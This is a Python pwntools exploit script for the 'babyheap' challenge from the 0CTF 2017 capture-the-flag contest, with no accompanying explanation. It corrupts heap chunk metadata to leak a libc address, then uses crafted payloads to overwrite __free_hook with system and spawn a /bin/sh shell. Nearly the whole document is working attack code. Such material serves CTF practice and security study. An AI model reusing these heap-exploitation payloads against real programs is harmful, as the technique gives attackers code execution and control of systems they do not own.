from pwn import *
import sys, os
context.log_level = 'debug'
prog = './babyheap_0ctf_2017'
elf = ELF(prog)
p = process(prog)
#os.system("patchelf --set-interpreter ./glibc-all-in-one/glibc-2.25/lib/ld-2.25.so "+prog)
#os.system("patchelf --set-rpath ./glibc-all-in-one/glibc-2.25/lib "+prog)
e = ELF("./glibc-all-in-one/glibc-2.25/lib/libc-2.25.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

p.readuntil('Command:')

def alloc(a):
	p.writeline('1')
	p.readuntil('Size:')
	p.writeline(str(a))
	p.readuntil('Command:')
def update(a,b,c):
	p.writeline('2')
	p.readuntil('Index:')
	p.writeline(str(a))
	p.readuntil('Size:')
	p.writeline(str(b))
	p.readuntil('Content:')
	p.write(c)
	p.readuntil('Command:')
def dele(a):	
	p.writeline('3')	
	p.readuntil('Index:')
	p.writeline(str(a))
	p.readuntil('Command:')
def exp():
	alloc(0x90) #0
	alloc(0x90) #1
	alloc(0x90) #2
	alloc(0x90) #3
	alloc(0x90) #4
	alloc(0x90) #5
	
	
	payload='a'*0x90+p64(0x00)+p64(0x141)
	payl='/bin/sh'+chr(0)
	update(0,len(payl),payl)
	update(2,len(payload),payload)
	dele(3)
	alloc(0x90)#3
	
	p.writeline('4')
	p.readuntil('Index:')
	p.writeline('4')
	p.readuntil('Content: \n')
	success(hex(e.sym['__malloc_hook']))
	libc=u64(p.read(6)+chr(0)*2)-e.sym['__malloc_hook']-88-0x30
	success(hex(libc))
	#dbg()
	free_hook=libc+e.symbols['__free_hook']
	alloc(0x90)
	dele(0)
	dele(1)
	dele(2)
	dele(3)
	dele(4)
	dele(5)
	alloc(0x20)
	alloc(0x510)
	alloc(0x20)
	alloc(0x520)
	alloc(0x20)
	
	dele(1)
	
	alloc(0x600)
	payload='a'*0x20+p64(0)+p64(0x511)+p64(0)+p64(free_hook-0x20+0x8)+p64(0)+p64(free_hook-0x45+0x8)
	dele(3)
	
	update(0,len(payload),payload)
	
	
	payload='a'*0x20+p64(0)+p64(0x521)+p64(0)+p64(free_hook-0x20)
	update(2,len(payload),payload)
	success(hex(free_hook))
	system=libc+e.symbols['system']

	alloc(0x40)
	payload='/bin/sh'+chr(0)*9+p64(system)
	update(3,len(payload),payload)
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
